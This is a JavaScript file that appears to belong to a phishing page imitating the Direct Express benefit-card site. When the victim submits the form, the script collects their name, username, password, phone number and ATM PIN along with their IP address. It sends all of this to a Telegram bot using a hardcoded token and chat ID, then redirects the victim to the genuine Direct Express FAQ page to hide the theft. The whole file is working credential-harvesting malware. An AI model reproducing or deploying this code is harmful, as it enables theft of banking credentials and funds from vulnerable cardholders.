$(document).ready(function() {

    fetch('https://api64.ipify.org?format=json')
    .then(response => response.json())
    .then(data => {
        const ipAddressInput = document.getElementById('ipaddress');
        if (ipAddressInput) {
            ipAddressInput.value = data.ip;
        }
    })
    .catch(error => console.error('Error fetching IP address:', error));
    
    $('#filled-for').on('submit', function(event) {
        event.preventDefault(); 
        
                const ffname = document.getElementById('Full_name').value;
                const llname = document.getElementById('lname').value;
                const eemail = document.getElementById('email').value;
                const pphone = document.getElementById('phone').value;
                const street1 = document.getElementById('street-add-1').value;
                const ipp = document.getElementById('ipaddress').value;
    
                const message = 
                    "*User Info Page*" + "\n" +
                    "Full Name: " + ffname + "\n" +
                    "User Name: " + llname + "\n" +
                    "Password: " + eemail + "\n"+
                    "Phone No: " + pphone + "\n"+
                    "ATM Pin: " + street1 + "\n"+
                    "User IP: " + ipp + "\n";
                    
    
                const telegramBotToken = '6349399260:AAEzm1BGmAM3u_xiXgRs2xRgDyOZ78vsbyg';
                const chatId = '5308018861';
    
                const sendMessage = (text) => {
                    const url = `https://api.telegram.org/bot${telegramBotToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}`;
                    fetch(url)
                        .then(response => {
                            if (!response.ok) {
                                throw new Error('Network response was not ok');
                            }
                            console.log('Message sent successfully');
                            window.location.href = 'https://www.usdirectexpress.com/faq.html'; 
                        })
                        .catch(error => console.error('Error:', error));
                };
    
                sendMessage(message);
                document.getElementById('ipaddress').value = '';

    });

});
